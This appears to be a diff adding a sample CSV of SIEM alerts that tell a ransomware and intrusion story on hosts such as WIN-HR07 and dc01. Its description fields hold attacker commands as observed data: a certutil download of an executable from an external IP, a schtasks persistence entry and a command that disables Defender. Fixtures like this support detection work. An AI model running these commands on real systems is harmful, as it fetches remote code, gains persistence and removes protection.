@@ -1,0 +1,11 @@
+_time,search_name,severity,host,src,category,description,rule_id
+2026-11-04T12:01:33.000+00:00,Endpoint - Ransomware Extension Detected - Rule,critical,WIN-HR07,10.0.4.47,malware,Multiple files renamed with .locked extension; ransom note README_DECRYPT.txt created,ES-0042
+2026-11-04T12:03:10.000+00:00,Network - Possible C2 Beacon Activity - Rule,high,WIN-HR07,10.0.4.47,network,Periodic HTTPS beacon every 60s to 198.51.100.200 (jitter < 5%),ES-0107
+2026-11-04T12:10:45.000+00:00,Access - Password Spray Detected - Rule,high,dc01,203.0.113.90,authentication,35 accounts with failed logons from a single source within 10 minutes (password spray),ES-0011
+2026-11-04T12:30:02.000+00:00,Endpoint - Scheduled Task Created via Command Line - Rule,medium,WIN-HR07,,endpoint,schtasks /create /tn Updater /tr C:\ProgramData\upd.exe /sc onlogon,ES-0230
+2026-11-04T13:15:00.000+00:00,Identity - User Added to Privileged Group - Rule,high,dc01,10.0.4.47,identity,A member was added to a security-enabled global group: Domain Admins (member: svc_temp),ES-0310
+2026-11-04T13:40:21.000+00:00,Endpoint - Windows Defender Real-Time Protection Disabled - Rule,medium,WIN-HR07,,endpoint,Set-MpPreference -DisableRealtimeMonitoring $true executed; real-time protection turned off,ES-0198
+2026-11-04T14:05:09.000+00:00,Network - Inbound RDP from Internet - Rule,medium,jump01,192.0.2.150,network,Inbound RDP (tcp/3389) session established from external address,ES-0402
+2026-11-04T14:30:00.000+00:00,Email - Suspicious Attachment Delivered - Rule,low,mail-gw,203.0.113.12,email,Phishing email with macro-enabled attachment invoice_8812.docm delivered to 3 recipients,ES-0501
+2026-11-04T15:00:00.000+00:00,Audit - Splunk Search Head Configuration Changed,informational,splunk-sh01,,audit,savedsearches.conf modified by admin,ES-0900
+2026-11-04T15:20:00.000+00:00,Endpoint - Certutil Download - Rule,high,WIN-FS01,10.0.3.30,endpoint,certutil -urlcache -split -f http://198.51.100.23/p.exe C:\Users\Public\p.exe,ES-0215
